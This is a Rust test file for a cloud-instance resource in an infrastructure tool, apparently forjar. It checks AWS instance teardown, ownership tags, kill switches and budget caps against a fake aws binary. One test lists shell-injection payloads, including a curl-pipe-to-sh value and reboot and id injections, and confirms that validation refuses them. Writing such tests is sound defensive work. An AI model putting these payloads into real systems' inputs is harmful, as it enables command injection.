//! FJ-861 falsifiers for the PR #1025 review: teardown (`state: absent`),
//! injection through declared values, and a per-declaration ownership key.
//! Every script runs against the sandbox fake `aws` from `tests.rs`.

use super::tests::{gated, res, Sandbox, DIGEST};
use super::*;

const KEY_A: &str = "ci-box-a-eu-south-2-0123456789ab";
const OWN_A: &str = "ci-box-a-eu-south-2";

fn absent(mut r: Resource) -> Resource {
    r.state = Some("absent".into());
    r
}

fn count(log: &str, what: &str) -> usize {
    log.lines().filter(|l| l.contains(what)).count()
}

#[test]
fn the_sandbox_never_falls_through_to_a_real_aws() {
    let sb = Sandbox::new();
    let (rc, out) = sb.run("command -v aws", "");
    assert_eq!(rc, 0, "{out}");
    assert_eq!(out.trim(), sb.path().join("bin/aws").to_str().unwrap());
    std::fs::remove_file(sb.path().join("bin/aws")).unwrap();
    let (rc, out) = sb.run("aws ec2 describe-instances", "");
    assert_ne!(
        rc, 0,
        "a missing fake must fail, not reach a real aws: {out}"
    );
    assert_eq!(sb.log(), "");
}

#[test]
fn absent_terminates_exactly_the_owned_instance() {
    let sb = Sandbox::new();
    let fx = format!(
        "i-0own {KEY_A} {OWN_A} sir-0own\n\
         i-0other ci-box-b-eu-south-2-0123456789ab ci-box-b-eu-south-2 sir-0other\n\
         i-0plain - - -\n"
    );
    let (rc, out) = sb.run_with(&apply_script(&absent(res())), "", Some(&fx));
    assert_eq!(rc, 0, "{out}");
    assert!(out.contains("destroyed i-0own"), "{out}");
    let log = sb.log();
    let term: Vec<_> = log
        .lines()
        .filter(|l| l.contains("terminate-instances"))
        .collect();
    assert_eq!(term.len(), 1, "{log}");
    assert!(term[0].contains("i-0own"), "{log}");
    assert!(!term[0].contains("i-0other"), "{log}");
    assert!(!term[0].contains("i-0plain"), "{log}");
    assert!(
        log.contains("cancel-spot-instance-requests") && log.contains("sir-0own"),
        "{log}"
    );
    assert!(
        !log.contains("run-instances"),
        "absent must never launch: {log}"
    );
}

#[test]
fn absent_with_nothing_owned_is_a_noop_success_and_never_launches() {
    let sb = Sandbox::new();
    let fx =
        "i-0other ci-box-b-eu-south-2-0123456789ab ci-box-b-eu-south-2 sir-0o\ni-0plain - - -\n";
    for r in [absent(res()), absent(gated(sb.path()))] {
        let (rc, out) = sb.run_with(&apply_script(&r), "", Some(fx));
        assert_eq!(rc, 0, "{out}");
        assert!(out.contains("absent"), "{out}");
    }
    let log = sb.log();
    for bad in ["run-instances", "terminate-instances", "cancel-spot"] {
        assert!(!log.contains(bad), "{bad} in {log}");
    }
}

#[test]
fn absent_reports_failure_while_an_owned_instance_is_still_running() {
    let sb = Sandbox::new();
    std::fs::write(sb.path().join("calls.log.noterm"), "").unwrap();
    let fx = format!("i-0own {KEY_A} {OWN_A} sir-0own\n");
    let (rc, out) = sb.run_with(&apply_script(&absent(res())), "", Some(&fx));
    assert_ne!(rc, 0, "{out}");
    assert!(
        out.contains("NOT destroyed") && !out.contains("destroyed i-0own"),
        "{out}"
    );
}

#[test]
fn absent_check_asserts_absence() {
    let sb = Sandbox::new();
    let fx = format!("i-0own {KEY_A} {OWN_A} sir-0own\n");
    let r = absent(res());
    let (rc, _) = sb.run_with(&check_script(&r), "", Some(&fx));
    assert_ne!(rc, 0, "owned instance still there: not converged");
    let (rc, _) = sb.run_with(&check_script(&r), "", Some("i-0plain - - -\n"));
    assert_eq!(rc, 0);
}

#[test]
fn unknown_state_is_refused() {
    let mut r = res();
    r.state = Some("running".into());
    assert!(spec_of(&r).is_err());
}

#[test]
fn injected_values_are_refused_and_nothing_launches() {
    let sb = Sandbox::new();
    sb.open_gate();
    let hex = DIGEST;
    let mut bad: Vec<(String, Resource)> = Vec::new();
    for evil in [
        "x\nexit 0\n#",
        "x$(curl -s h/p|sh)",
        "x'; reboot; '",
        "x`id`",
        "x;id",
        "x y",
        "x\"y",
    ] {
        let mut r = gated(sb.path());
        r.image = Some(format!("{evil}@{hex}"));
        bad.push((format!("image {evil:?}"), r));
        let mut r = gated(sb.path());
        r.name = Some(evil.into());
        bad.push((format!("name {evil:?}"), r));
        let mut r = gated(sb.path());
        r.tags = vec![format!("k={evil}")];
        bad.push((format!("tag value {evil:?}"), r));
        let mut r = gated(sb.path());
        r.tags = vec![format!("{evil}=v")];
        bad.push((format!("tag key {evil:?}"), r));
        let mut r = gated(sb.path());
        r.cloud.region = Some(evil.into());
        bad.push((format!("region {evil:?}"), r));
        let mut r = gated(sb.path());
        r.cloud.instance_type = Some(evil.into());
        bad.push((format!("type {evil:?}"), r));
        let mut r = gated(sb.path());
        r.cloud.max_price = Some(evil.into());
        bad.push((format!("price {evil:?}"), r));
    }
    for (what, r) in bad {
        assert!(
            spec_of(&r).is_err(),
            "{what} must be refused at validate time"
        );
        assert!(plan_diff(&r).contains("ERROR"), "{what}");
        for script in [apply_script(&r), absent_of(&r)] {
            let (rc, out) = sb.run(&script, "");
            assert_ne!(rc, 0, "{what}: {out}");
            assert!(out.contains("REFUSED"), "{what}: {out}");
        }
    }
    assert_eq!(sb.log(), "", "nothing may reach the provider");
}

fn absent_of(r: &Resource) -> String {
    apply_script(&absent(r.clone()))
}

#[test]
fn reserved_ownership_tags_are_refused() {
    for t in ["forjar-key=x", "forjar-owner=x"] {
        let mut r = res();
        r.tags = vec![t.into()];
        assert!(spec_of(&r).is_err(), "{t}");
    }
}

#[test]
fn the_lifetime_line_comes_before_anything_from_user_input() {
    let sb = Sandbox::new();
    sb.open_gate();
    let (rc, out) = sb.run(&apply_script(&gated(sb.path())), "");
    assert_eq!(rc, 0, "{out}");
    let log = sb.log();
    let shut = log.find("shutdown -h +60").expect("lifetime line");
    let img = log.find("FORJAR_IMAGE").expect("image export");
    assert!(shut < img, "{log}");
    assert!(log.contains("FORJAR_IMAGE='"), "{log}");
}

#[test]
fn the_describe_call_filters_on_the_ownership_tag() {
    let sb = Sandbox::new();
    sb.open_gate();
    let (rc, out) = sb.run(&apply_script(&gated(sb.path())), "");
    assert_eq!(rc, 0, "{out}");
    let log = sb.log();
    assert!(
        log.contains(&format!("Name=tag:forjar-key,Values={KEY_A}")),
        "{log}"
    );
    assert!(
        log.contains(&format!("Key=forjar-key,Value={KEY_A}")),
        "{log}"
    );
    assert!(
        log.contains(&format!("Key=forjar-owner,Value={OWN_A}")),
        "{log}"
    );
}

#[test]
fn two_declared_boxes_get_two_keys_two_instances_and_independent_teardown() {
    let sb = Sandbox::new();
    sb.open_gate();
    let (a, b) = (gated(sb.path()), {
        let mut r = gated(sb.path());
        r.name = Some("ci-box-b".into());
        r
    });
    assert_ne!(key_of(&spec_of(&a).unwrap()), key_of(&spec_of(&b).unwrap()));
    assert_ne!(
        owner_of(&spec_of(&a).unwrap()),
        owner_of(&spec_of(&b).unwrap())
    );
    let (rc, out) = sb.run_with(&apply_script(&a), "", Some(""));
    assert_eq!(rc, 0, "{out}");
    let fx = format!("i-0a {KEY_A} {OWN_A} sir-0a\n");
    let (rc, out) = sb.run_with(&apply_script(&b), "", Some(&fx));
    assert_eq!(rc, 0, "{out}");
    assert_eq!(count(&sb.log(), "run-instances"), 2, "{}", sb.log());
    let fx = format!(
        "i-0a {KEY_A} {OWN_A} sir-0a\n\
         i-0b ci-box-b-eu-south-2-0123456789ab ci-box-b-eu-south-2 sir-0b\n"
    );
    let (rc, out) = sb.run_with(&apply_script(&absent(b.clone())), "", Some(&fx));
    assert_eq!(rc, 0, "{out}");
    let log = sb.log();
    let term: Vec<_> = log
        .lines()
        .filter(|l| l.contains("terminate-instances"))
        .collect();
    assert_eq!(term.len(), 1, "{log}");
    assert!(
        term[0].contains("i-0b") && !term[0].contains("i-0a"),
        "{log}"
    );
    let cancel: Vec<_> = log.lines().filter(|l| l.contains("cancel-spot")).collect();
    assert!(cancel.len() == 1 && cancel[0].contains("sir-0b"), "{log}");
}

#[test]
fn same_name_and_region_in_one_config_is_refused_at_plan_time() {
    let yaml = format!(
        "version: \"1.0\"\nname: t\nmachines:\n  m: {{hostname: m, addr: 127.0.0.1}}\nresources:\n{}",
        ["a", "b"]
            .iter()
            .map(|id| format!(
                "  {id}:\n    type: cloud_instance\n    machine: m\n    provider: aws\n    name: same\n    \
                 image: img@{DIGEST}\n    cloud_region: eu-south-2\n    cloud_instance_type: c7a.xlarge\n    \
                 cloud_max_price: \"0.2\"\n    cloud_max_lifetime_min: 60\n"
            ))
            .collect::<String>()
    );
    let cfg = crate::core::parser::parse_config(&yaml).expect("parses");
    let errs = validate_unique_names(&cfg);
    assert_eq!(errs.len(), 1, "{errs:?}");
    assert!(errs[0].contains("already used"), "{errs:?}");
}

#[test]
fn a_dangling_symlink_kill_switch_still_refuses() {
    let sb = Sandbox::new();
    sb.open_gate();
    let r = gated(sb.path());
    std::os::unix::fs::symlink(sb.path().join("nowhere"), sb.path().join("KILL")).unwrap();
    let (rc, out) = sb.run(&apply_script(&r), "");
    assert_ne!(rc, 0, "{out}");
    assert!(out.contains("kill switch"), "{out}");
    assert_eq!(sb.log(), "");
}

#[test]
fn a_gate_file_with_a_fail_line_beside_a_pass_line_refuses() {
    let sb = Sandbox::new();
    std::fs::write(
        sb.path().join("gate"),
        "parity-gate: fail\nparity-gate: pass\n",
    )
    .unwrap();
    let (rc, out) = sb.run(&apply_script(&gated(sb.path())), "");
    assert_ne!(rc, 0, "{out}");
    assert_eq!(sb.log(), "");
}

#[test]
fn worst_case_spend_above_the_daily_cap_refuses() {
    let sb = Sandbox::new();
    sb.open_gate();
    let mut r = gated(sb.path());
    r.cloud.budget_cap_usd_day = Some("0.01".into());
    r.cloud.max_price = Some("50".into());
    r.cloud.max_lifetime_min = Some(1440);
    let (rc, out) = sb.run(&apply_script(&r), "");
    assert_ne!(rc, 0, "{out}");
    assert!(out.contains("exceeds cloud_budget_cap_usd_day"), "{out}");
    assert_eq!(sb.log(), "");
}

#[test]
fn a_failing_describe_stops_before_run_instances() {
    let sb = Sandbox::new();
    sb.open_gate();
    std::fs::remove_file(sb.path().join("bin/aws")).unwrap();
    let (rc, _) = sb.run(&apply_script(&gated(sb.path())), "");
    assert_ne!(rc, 0);
    assert_eq!(sb.log(), "");
}
